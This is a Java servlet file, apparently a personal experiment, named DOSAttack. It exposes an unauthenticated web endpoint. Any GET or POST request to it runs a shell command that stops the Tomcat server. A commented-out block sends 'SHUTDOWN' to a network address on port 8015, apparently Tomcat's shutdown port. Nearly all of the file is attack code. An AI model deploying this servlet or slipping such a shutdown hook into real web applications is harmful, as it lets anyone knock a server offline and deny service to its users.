package DOSPackage;

import java.io.IOException;
import java.io.PrintStream;
import java.net.Socket;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet implementation class DOSAttack
 */
@WebServlet("/DOSAttack")
public class DOSAttack extends HttpServlet {
	private static final long serialVersionUID = 1L;
    //Djava.net.preferIPv4Stack=true
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
	            try {
				   String filename = "/home/auzmor/Desktop/tomcat/bin/catalina.sh stop";
				   Process child = Runtime.getRuntime().exec(filename);
				   System.out.println(filename+""+child);
//	            	System.out.println("starting down server ...");
//	            	try {
//	            	    Thread.sleep(30000);
//	            	}
//	            	catch (Exception excp) {
//	            		
//	            	}
//				       Socket s = new Socket("192.168.1.255", 8015);
//				       if(s.isConnected()) {
//			            PrintStream os = new PrintStream(s.getOutputStream(),true);
//			            os.println("SHUTDOWN");
//			            s.close();
//			            System.out.println("Shutting down server ...");
//			        } else {
//			        	System.out.println("not connected");
//			        }
	            }catch(IOException e) {
				System.out.println("exception occured"+e);
			}

	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		doGet(request, response);
	}

}
